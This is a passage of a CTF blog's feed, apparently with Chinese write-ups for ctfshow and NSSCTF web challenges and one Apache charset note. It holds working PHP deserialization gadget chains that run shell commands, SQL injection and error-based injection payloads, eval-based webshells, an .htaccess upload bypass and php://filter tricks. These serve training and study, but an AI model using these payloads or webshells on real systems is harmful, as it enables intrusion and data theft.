   public function __construct()        {            $this-&gt;keys=array('hello'=&gt;'php');            $this-&gt;path = new See();        }    }    echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache()));}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="270"><a href="#270" class="headerlink" title="270"></a>270</h2><pre class="line-numbers language-none"><code class="language-none">&lt;?phpnamespace yii\rest{    class IndexAction{        public $checkAccess;        public $id;        public function __construct(){            $this-&gt;checkAccess = 'passthru';            $this-&gt;id = 'cat /f*';        }    }}namespace yii\db{    use yii\web\DbSession;    class BatchQueryResult    {        private $_dataReader;        public function __construct(){            $this-&gt;_dataReader=new DbSession();        }    }}namespace yii\web{    use yii\rest\IndexAction;    class DbSession    {        public $writeCallback;        public function __construct(){            $a=new IndexAction();            $this-&gt;writeCallback=[$a,'run'];        }    }}namespace{    use yii\db\BatchQueryResult;    echo base64_encode(serialize(new BatchQueryResult()));}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-爆破</title>
      <link href="/2022/01/24/ctfshow-bao-po/"/>
      <url>/2022/01/24/ctfshow-bao-po/</url>
      
        <content type="html"><![CDATA[<h2 id="web-21"><a href="#web-21" class="headerlink" title="web 21"></a>web 21</h2><p>burp 抓包</p><p><img src="/2022/01/24/ctfshow-bao-po/image-20220124105406410.png" alt="image-20220124105406410"></p><p>用户名密码都base64加密了</p><p><img src="/2022/01/24/ctfshow-bao-po/image-20220124105444068.png" alt="image-20220124105444068"></p><p>抓到的包发送到Intruder</p><p><img src="/2022/01/24/ctfshow-bao-po/image-20220124105604338.png" alt="image-20220124105604338"></p><p>选择 custom iterator(自定义迭代器)-&gt;position 1admin  position 2 :  position 3 字典-&gt;base64编码</p><p><img src="/2022/01/24/ctfshow-bao-po/image-20220124105805789.png" alt="image-20220124105805789"></p><p><img src="/2022/01/24/ctfshow-bao-po/image-20220124105934117.png" alt="image-20220124105934117"></p><h2 id="web-22"><a href="#web-22" class="headerlink" title="web 22"></a>web 22</h2><p><a href="http://z.zcjun.com/">http://z.zcjun.com/</a> 在线子域名爆破 (此题不能爆破出来)</p><h2 id="web-23"><a href="#web-23" class="headerlink" title="web 23"></a>web 23</h2><p>根据源码写个脚本</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$dict</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"0123456789qwertyuiopasdfghjklzxcvbnm"</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span> <span class="token number">36</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">&lt;</span><span class="token number">36</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$token</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$dict</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$dict</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">===</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"加密后的md5值为："</span><span class="token operator">.</span><span class="token variable">$token</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>                <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"解密后的值为："</span><span class="token operator">.</span><span class="token variable">$dict</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$dict</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行后得到结果</p><h2 id="web24"><a href="#web24" class="headerlink" title="web24"></a>web24</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$s</span><span class="token operator">=</span> <span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token number">372619038</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web-25"><a href="#web-25" class="headerlink" title="web 25"></a>web 25</h2><p>根据题目 ?r=0 可以得到$rand进而得到mt_rand()</p><p>逆推工具尝试逆推出种子：工具地址：<a href="https://github.com/Al1ex/php_mt_seed">https://github.com/Al1ex/php_mt_seed</a></p><h2 id="web-26"><a href="#web-26" class="headerlink" title="web 26"></a>web 26</h2><p>右键查看源代码</p><p><img src="/2022/01/24/ctfshow-bao-po/image-20220124194036551.png" alt="image-20220124194036551"></p><h2 id="web-27"><a href="#web-27" class="headerlink" title="web 27"></a>web 27</h2><p>爆破日期</p><p><img src="/2022/01/24/ctfshow-bao-po/image-20220124194511005.png" alt="image-20220124194511005"></p><p><img src="C:/Users/86181/AppData/Roaming/Typora/typora-user-images/image-20220124194428100.png" alt="image-20220124194428100"></p><h2 id="web-28"><a href="#web-28" class="headerlink" title="web 28"></a>web 28</h2><p><img src="/2022/01/24/ctfshow-bao-po/image-20220124200059003.png" alt="image-20220124200059003"></p><p><img src="/2022/01/24/ctfshow-bao-po/image-20220124200125520.png" alt="image-20220124200125520"></p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爆破 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-信息收集</title>
      <link href="/2022/01/23/ctfshow-xin-xi-shou-ji/"/>
      <url>/2022/01/23/ctfshow-xin-xi-shou-ji/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="web-1"><a href="#web-1" class="headerlink" title="web 1"></a>web 1</h2><p>F12 右键查看网页源代码可得</p><h2 id="web-2"><a href="#web-2" class="headerlink" title="web 2"></a>web 2</h2><p>ctrl+u 查看网页源代码可得  或者抓包获取网页源代码</p><h2 id="web-3"><a href="#web-3" class="headerlink" title="web 3"></a>web 3</h2><p>flag就隐藏在请求头信息中 </p><p>可以F12 -&gt;Network -&gt;Headers  或者直接抓包</p><h2 id="web-4"><a href="#web-4" class="headerlink" title="web 4"></a>web 4</h2><p>访问/robots.txt  得到flag在其中的目录中</p><h2 id="web-5"><a href="#web-5" class="headerlink" title="web 5"></a>web 5</h2><p>phps文件就是php的源代码文件，通常用于提供给用户（访问者）查看php代码，因为用户无法直接通过Web浏览器看到php文件的内容，所以需要用phps文件代替</p><p>访问 index.phps</p><h2 id="web-6"><a href="#web-6" class="headerlink" title="web 6"></a>web 6</h2><p>访问<a href="http://www.zip/">www.zip</a>   也是fuzz经常测试的</p><h2 id="web-7"><a href="#web-7" class="headerlink" title="web 7"></a>web 7</h2><p>版本控制，对站点自动部署  有 git hg  svn</p><p>根据提示 .git/</p><h2 id="web-8"><a href="#web-8" class="headerlink" title="web 8"></a>web 8</h2><p>根据提示 .svn/</p><h2 id="web-9"><a href="#web-9" class="headerlink" title="web 9"></a>web 9</h2><p>在vim编辑文本时会创建一个临时文件，如果程序正常退出，临时文件自动删除，如果意外退出就会保留，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容</p><p>以 index.php 为例 第一次产生的缓存文件名为 index.php.swp<br>第二次意外退出后，文件名为index.php.swo<br>第三次产生的缓存文件则为 index.php.swn</p><h2 id="web-10"><a href="#web-10" class="headerlink" title="web 10"></a>web 10</h2><p>cookie 中</p><h2 id="web-11"><a href="#web-11" class="headerlink" title="web 11"></a>web 11</h2><p>对ctfshow域名进行dns查询，查看TXT记录</p><p>阿里云查询链接 <a href="https://zijian.aliyun.com/">https://zijian.aliyun.com/</a></p><h2 id="web-12"><a href="#web-12" class="headerlink" title="web 12"></a>web 12</h2><p>根据题目提示，我们访问robots.txt，获取到后台地址</p><p>用户名为 admin 密码为底下Help line Number</p><h2 id="web-13"><a href="#web-13" class="headerlink" title="web 13"></a>web 13</h2><p>根据题目提示 技术文档 在页面下面发现 document 下载发现里面存在后台地址和用户名密码登录成功获 得flag</p><h2 id="web-14"><a href="#web-14" class="headerlink" title="web 14"></a>web 14</h2><p>打开网站，根据提示访问<code>http://4696e930-9cb3-47fd-a00b-c671f82fe4a4.chall.ctf.show/editor/</code></p><p>看到一个编辑器，在flash的上传中，发现有个文件空间</p><p>找了找，flag在var/www/html/nothinghere/fl000g.txt中，于是构造url访问</p><pre class="line-numbers language-none"><code class="language-none">http://4696e930-9cb3-47fd-a00b-c671f82fe4a4.chall.ctf.show/nothinghere/fl000g.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="web-15"><a href="#web-15" class="headerlink" title="web 15"></a>web 15</h2><p>根据提示 访问 /admin到后台 忘记密码 密保为所在城市 又在页面留下了qq邮箱，通过qq加好友然后可以得知所在城市 修改密码   用户名为admin</p><h2 id="web-16"><a href="#web-16" class="headerlink" title="web 16"></a>web 16</h2><p>考察PHP探针php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。 url后缀名添加/tz.php 版本是雅黑PHP探针，然后查看phpinfo搜索flag</p><h2 id="web-17"><a href="#web-17" class="headerlink" title="web 17"></a>web 17</h2><p>根据提示</p><p>/backup.sql</p><h2 id="web-18"><a href="#web-18" class="headerlink" title="web 18"></a>web 18</h2><p>查看js文件，查看flag的条件，去通过uncode解码(你赢了，去幺幺零点皮爱吃皮看看)   访问110.php</p><h2 id="web-19"><a href="#web-19" class="headerlink" title="web 19"></a>web 19</h2><p>前端查看源代码，post提交用户名密码<br>post: username=admin&amp;pazzword=a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04</p><h2 id="web-20"><a href="#web-20" class="headerlink" title="web 20"></a>web 20</h2><p>根据题目提示，是mdb文件泄露</p><p> mdb文件是早期asp+access构架的数据库文件</p><p>于是我们访问/db/db.mdb，</p><pre class="line-numbers language-none"><code class="language-none">http://5c070a5e-3a51-4904-a668-4385dfa7e714.chall.ctf.show/db/db.mdb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>下载db.mdb文件后，用记事本打开搜索flag</p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>apache乱码问题</title>
      <link href="/2022/01/22/apache-luan-ma-wen-ti/"/>
      <url>/2022/01/22/apache-luan-ma-wen-ti/</url>
      
        <content type="html"><![CDATA[<h2 id="服务器端："><a href="#服务器端：" class="headerlink" title="服务器端："></a>服务器端：</h2><p>修改httpd.conf<br>查找：<br>AddDefaultCharset ISO-8859-1<br>改成：<br>#AddDefaultCharset ISO-8859-1<br>AddDefaultCharset off</p><p>这种方式关掉了服务器的默认语言的发送，这样仅凭html文件头中设置的语言来决定网页语言。</p><p>有人直接用</p><p>AddDefaultCharset GB2312</p><p>但是不建议这样做。</p><p>重新启动Apache,</p><h2 id="客户端："><a href="#客户端：" class="headerlink" title="客户端："></a>客户端：</h2><p>在中文网页请中依情况在标签中添加：<br>GB2312 (简体中文): (&lt;META http-equiv=”Content-Type” content=”text/html; charset=gb2312″ /&gt;)</p><p>BIG5(繁体中文): (&lt;META http-equiv=”Content-Type” content=”text/html; charset=big5″ /&gt;)</p><p>UTF-8: (注意是UTF-8，而不是UTF8) (&lt;META http-equiv=”Content-Type” content=”text/html; charset=utf-8″ /&gt;)</p><p>如果还是不正常，请清空浏览器的Cache试试。</p>]]></content>
      
      
      <categories>
          
          <category> apache </category>
          
      </categories>
      
      
        <tags>
            
            <tag> apache乱码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件查看器</title>
      <link href="/2022/01/22/wen-jian-cha-kan-qi/"/>
      <url>/2022/01/22/wen-jian-cha-kan-qi/</url>
      
        <content type="html"><![CDATA[<p>用dirsearch扫 发现<a href="http://www.zip下载源码/">www.zip下载源码</a> </p><p>开审</p><p>审一圈发现</p><p><img src="/2022/01/22/wen-jian-cha-kan-qi/image-20211206222637808.png" alt="image-20211206222637808"></p><p>这里触发phar反序列化</p><p>找链子最好的方法就是倒着找</p><p>先找危险函数</p><p><img src="/2022/01/22/wen-jian-cha-kan-qi/image-20211206222728642.png" alt="image-20211206222728642"></p><p>再找从哪能过来，访问了该类没有的属性即可以到这里</p><p><img src="/2022/01/22/wen-jian-cha-kan-qi/image-20211206222814988.png" alt="image-20211206222814988"></p><p>那怎么到__toString()呢</p><p><img src="/2022/01/22/wen-jian-cha-kan-qi/image-20211206222854244.png" alt="image-20211206222854244"></p><p>但是到这里就卡住了 因为怎么来调这个check呢 那也只能从析构里面走啊</p><p>password怎么写呢</p><p>$a=new User();</p><p>password=array($a,’check’)</p><p><img src="/2022/01/22/wen-jian-cha-kan-qi/image-20211206223043698.png" alt="image-20211206223043698"></p><p>链子构造好了，本地测试一下可以通，那么接下来就是怎么往里头写phar文件了我注意到有个log目录</p><p>这里要介绍 php://filter里面有个过滤器convert.base64-decode,他会把文件里面的非base64字符全都无视掉，所以我们想办法把除payload以外的东西全都控成非base64字符。</p><p>一.首先我们先使用过滤器的一些特性将log/error.txt的内容进行清空</p><p>php://filter/write=convert.iconv.utf-8.UCS-2|convert.quoted-printable-encode|convert.iconv.UCS-</p><p>2.utf-8|convert.base64-decode/resource=log/error.txt</p><p>二.将需要写入的payload编码  先base64编码再改成符合convert.quoted-printable的形式</p><pre class="line-numbers language-none"><code class="language-none">Python 3.9.0 (default, Nov 21 2020, 14:01:50)[Clang 12.0.0 (clang-1200.0.32.27)] on darwinType "help", "copyright", "credits" or "license" for more information.&gt;&gt;&gt; import base64&gt;&gt;&gt; s = 'PD9waHAgX19IQUxUX0NPTV ... gAAAEdCTUI='&gt;&gt;&gt; ''.join(["=" + hex(ord(i))[2:] + "=00" for i in s]).upper()'=50=00=44=00=39= ... 00=55=00=49=00=3D=00'&gt;&gt;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意：这样改造convert.quoted-printable的形式多加了 “=00”；</p><p>三.</p><p>payload:</p><p>php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=log/error.txt</p><p><img src="/2022/01/22/wen-jian-cha-kan-qi/image-20211206224259456.png" alt="image-20211206224259456"></p><p>这样就可以写入任意文件了  因为过滤了utf16 所以我用UCS-2  注意有坑 </p><p>我第三步是</p><p><img src="/2022/01/22/wen-jian-cha-kan-qi/image-20211208230036756.png" alt="image-20211208230036756"></p><p><img src="/2022/01/22/wen-jian-cha-kan-qi/image-20211208230053765.png" alt="image-20211208230053765"></p><p>生成的复制全部然后在前面还要加 “=00”；</p><p>总之这里许多坑 多调试就好了。</p><p>我们直接跑  phar://log/error.txt  啥都没发生</p><p>值得注意的是源码里面filter方法一旦匹配到phar就抛出异常从而导致程序非正常结束，然后就无法执行我们的pop链的第一个析构函数从而切断整个pop链。我们想到php的垃圾回收机制，在制作phar文件时传入一个数组让某个变量指向对象再让变量指向0 就能在抛出异常之前立马执行析构函数从而链子导通。</p><p>例如某数组的0键 值是我们要的对象 然后再把他的值变为0 这里就触发了强制垃圾回收</p><p>所以我们先<img src="/2022/01/22/wen-jian-cha-kan-qi/image-20211208230757202.png" alt="image-20211208230757202"></p><p>下面是整个做法</p><p><img src="/2022/01/22/wen-jian-cha-kan-qi/image-20211208230738536.png" alt="image-20211208230738536"></p><p>但是我们还需要去修改序列化后的值把1那个健改成0 </p><p>但是phar文件一旦生成后直接改内容是不行的，因为类似这种文件都会有一个校验值。</p><p>那我们直接更改肯定是一个不合法的phar，看到官方手册</p><p><img src="/2022/01/22/wen-jian-cha-kan-qi/image-20211208231312891.png" alt="image-20211208231312891"></p><p>最后四个字节是GBMB</p><p>再倒数四个字节是签名算法</p><p>再往前20个字节就算签名内容</p><p><img src="/2022/01/22/wen-jian-cha-kan-qi/image-20211208231453721.png" alt="image-20211208231453721"></p><p>用来读取修改后的内容和生成签名</p><p>然后我们直接手改签名内容</p><p>重复上面写入步骤得到flag</p>]]></content>
      
      
      <categories>
          
          <category> NSSCTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NSSCTF文件查看器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTF新生赛</title>
      <link href="/2022/01/22/nssctf-xin-sheng-sai/"/>
      <url>/2022/01/22/nssctf-xin-sheng-sai/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="gift-F12"><a href="#gift-F12" class="headerlink" title="gift_F12"></a>gift_F12</h2><p>简单的信息收集 按F12 crtl+f 搜flag</p><h2 id="caidao"><a href="#caidao" class="headerlink" title="caidao"></a>caidao</h2><p>直接上蚁剑连接 找到flag</p><h2 id="jicao"><a href="#jicao" class="headerlink" title="jicao"></a>jicao</h2><p>json是通过对字符串进行解码的一种格式</p><p>直接传参 json={“x”:”wllm”} post : id=wllmNB</p><h2 id="Do-you-know-http"><a href="#Do-you-know-http" class="headerlink" title="Do_you_know_http"></a>Do_you_know_http</h2><p>抓包 伪造http请求里面的user-agent为指定的浏览器</p><p><img src="/2022/01/22/nssctf-xin-sheng-sai/ebaabed4d9a399d06db59c3260a0d0cb.png" alt="image-20211007220917674"></p><p>访问响应出来的 a.php  它说只能通过本地访问 伪造http请求ip地址为本地</p><p>X-Forwarded-For:</p><p><img src="/2022/01/22/nssctf-xin-sheng-sai/c3dbf270430e2059851a61a147edcc10.png" alt="img"></p><p>访问./secretttt.php 得到flag</p><h2 id="easy-md5"><a href="#easy-md5" class="headerlink" title="easy_md5"></a>easy_md5</h2><p>md5弱比较  PHP在处理哈希字符串的时候，它把每一个以0e开头的哈希值都解析为0</p><p>在md5加密后以0E开头  </p><ul><li>QNKCDZO</li><li>240610708</li><li>s878926199a</li><li>s155964671a</li></ul><p>md5强比较</p><p>PHP中md5()函数无法处理数组（会返回NULL）来实现绕过。</p><p>md5碰撞  不同字符串 MD5加密一样</p><p>任选其一可得flag</p><h2 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h2><p>提示参数是wllm 随便输入报错 发现是sql注入</p><p>猜想要怎么样闭合语句</p><p>-1’order by 4 –+  测试有多少列</p><p>-1’ union select 1,database(),2 –+ 数据库名</p><p>-1’ union select  1,group_concat(table_name) from information_schema.tables where table_schema=”test_db”–+    表名</p><p>-1’ union select 1,group_concat(column_name) from information_schema.columns where table_name=”test_tb”–+ 得到列名   有id和flag（group_concat将得到结果组合在一起，不用的话只能得到一列名叫id）</p><p>-1’ union select  1,flag,2 from test_tb –+ 得到flag</p><h2 id="easyupload1-0"><a href="#easyupload1-0" class="headerlink" title="easyupload1.0"></a>easyupload1.0</h2><p>将一句话木马改成.png格式 抓包改回.php文件</p><p><img src="/2022/01/22/nssctf-xin-sheng-sai/91def65db7455d555660620df570ea88.png" alt="image-20211007222416744"></p><p>蚁剑连接获得flag</p><p><img src="/2022/01/22/nssctf-xin-sheng-sai/d29ab3bcb5b8a319d7de8fd13f7d3f0a.png" alt="image-20211007222516794"></p><p>假的  传入phpinfo();</p><p>查找nssctf关键字得到flag</p><h2 id="easyupload2-0"><a href="#easyupload2-0" class="headerlink" title="easyupload2.0"></a>easyupload2.0</h2><p>上传php文件是不行的  但我们还可以用.phtml</p><script language="php">@eval($_POST['a']);</script> GIF89a? <script language="php">eval($_REQUEST[shell])</script><p><img src="/2022/01/22/nssctf-xin-sheng-sai/2c30ca7a8e4edda6d2386a5882b68fd0.png" alt="image-20211007223010302"></p><p>然后上蚁剑连 查看flag.php 得到flag</p><h2 id="easyrce"><a href="#easyrce" class="headerlink" title="easyrce"></a>easyrce</h2><p>先 ?url=system(‘ls /‘) 查看根目录下有哪些文件</p><p>然后直接 ?url=system(‘cat /f*’);  得到flag</p><h2 id="babyrce"><a href="#babyrce" class="headerlink" title="babyrce"></a>babyrce</h2><p>根据题目意思设置cookie 值</p><p><img src="/2022/01/22/nssctf-xin-sheng-sai/84afcd42955816dbbc5a41f35b5e4500.png" alt="image-20211007223747659"></p><p>然后访问rasalghul.php 发现源码过滤了空格 通过%09进行绕过得到flag</p><p>?url=cat%09/f*</p><h2 id="ez-unserialize"><a href="#ez-unserialize" class="headerlink" title="ez_unserialize"></a>ez_unserialize</h2><p>查看源码 发现</p><p><img src="https://img-blog.csdnimg.cn/img_convert/5f0d8ee6a95317f8ebfef75da68b9b24.png" alt="img">  显然要访问robots.txt  得到/cl45s.php 获得题目源码</p><p><img src="/2022/01/22/nssctf-xin-sheng-sai/image-20211027145914927.png" alt="image-20211027145914927"></p><p>得到 序列化后的字符串 O:4:”wllm”:2:{s:5:”admin”;s:5:”admin”;s:6:”passwd”;s:3:”ctf”;}</p><p>传?p=O:4:”wllm”:2:{s:5:”admin”;s:5:”admin”;s:6:”passwd”;s:3:”ctf”;} 得到flag</p><h2 id="include"><a href="#include" class="headerlink" title="include"></a>include</h2><p>提示传入一个file试一试 那就传入file参数 得到源码</p><p>使用伪协议得到加密flag  base64解密即可得到flag</p><p><img src="/2022/01/22/nssctf-xin-sheng-sai/6eb3ede8a4dffe536c47d6793b138452.png" alt="image-20211007225050149"></p><h2 id="error"><a href="#error" class="headerlink" title="error"></a>error</h2><p>猜测是报错注入 </p><p>update构造注入语句：select name from user where id=1 and updatexml(1,concat(‘~’,(select database())),3);</p><p>解释：由于updatexml的第二个参数需要Xpath格式的字符串，以~开头的内容不是xml格式的语法，concat()函数为字符串连接函数显然不符合规则，但是会将括号内的执行结果以错误的形式报出，这样就可以实现报错注入了。</p><p>所以此题可以</p><p>id=1‘ and updatexml(1,concat(‘~’,(select group_concat(table_name) from information_shcema.tables where table_name=database())),3);</p><p>由此获得表名 继而获得列名 得到flag 发现flag不全</p><p><img src="/2022/01/22/nssctf-xin-sheng-sai/f4dbc1302113455dd2a263828363d1fa.png" alt="image-20211007230329949"></p><p>获得剩下的flag</p><h2 id="no-wakeup"><a href="#no-wakeup" class="headerlink" title="no_wakeup"></a>no_wakeup</h2><p><img src="/2022/01/22/nssctf-xin-sheng-sai/image-20211027150153052.png" alt="image-20211027150153052"></p><p>获得序列化后的字符串</p><p>因为需要绕过魔术方法 wakeup 只需要将变量数目改成比原名数目大的即可;</p><p>O:6:“HaHaHa”:3:{s:5:“admin”;s:5:“admin”;s:6:“passwd”;s:4:“wllm”;} 绕过wakeup 得到flag</p><h2 id="easyupload3-0"><a href="#easyupload3-0" class="headerlink" title="easyupload3.0"></a>easyupload3.0</h2><p>输入一个错误的url,让其报错,发现是apache,猜测是用.htaccess</p><p>什么是.htaccess?</p><p>.htaccess文件(分布式配置文件)提供了一种方式，使得配置文件可以随文件夹不同</p><p>而不同，其所放置的文件夹及所有子文件夹都会受此影响，其语法同apache主配置文件。</p><p>如何利用.htaccess?</p><p>场景：启用了.htaccess文件的网站，使用此文件类型来绕过限制较全面的黑名单过滤。</p><p>方法：</p><p>\1. 上传一个.htaccess文件，文件内容设置为【AddType application/x-httpd-php .test】。</p><p>\2. 上传一句话木马文件，文件名设置为shell.test。</p><p>\3. 在浏览器中访问shell.test即可执行一句话木马。</p><p> 蚁剑链接shell.test 得到flag</p><p><img src="/2022/01/22/nssctf-xin-sheng-sai/3075aaf921f2ab97e0169998dec308f8.png" alt="image-20211007231334353"></p><h2 id="finalrce"><a href="#finalrce" class="headerlink" title="finalrce"></a>finalrce</h2><p>exec是没有回显的,可以写入文件获得回显</p><p>没有过虑|,可以使用tee进行写入文件,可以使用‘’来绕过过虑了命令</p><p>获得flag:?url=ca’’t /flllll’’aaaaaaggggggg|tee 1.txt</p><p>访问1.txt 得到flag</p><h2 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h2><p>发现魔术方法toString （当一个对象被当作字符串输出的时候，会自动触发）</p><p>构造pop链</p><p>因为类w44m中的成员变量是受保护的,要编码得到的序列化字符串才行</p><p><img src="/2022/01/22/nssctf-xin-sheng-sai/image-20211027150626274.png" alt="image-20211027150626274"></p><h2 id="PseudoProtocols"><a href="#PseudoProtocols" class="headerlink" title="PseudoProtocols"></a><strong>PseudoProtocols</strong></h2><p>使用php://filter读取</p><p>?wllm=php://filter/convert.base64-encode/resource=hint.php</p><p>base64 解码得到<img src="/2022/01/22/nssctf-xin-sheng-sai/f3d1057db5755fb36cc835f6dd664a8b.png" alt="img"></p><p>访问 得到源码</p><p>使用data协议即可得到flag</p><p>?a=data://text/plain;base64,SSB3YW50IGZsYWc=</p>]]></content>
      
      
      <categories>
          
          <category> NSSCTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 新生赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图片隐写</title>
      <link href="/2022/01/22/tu-pian-yin-xie-zong-jie/"/>
      <url>/2022/01/22/tu-pian-yin-xie-zong-jie/</url>
      
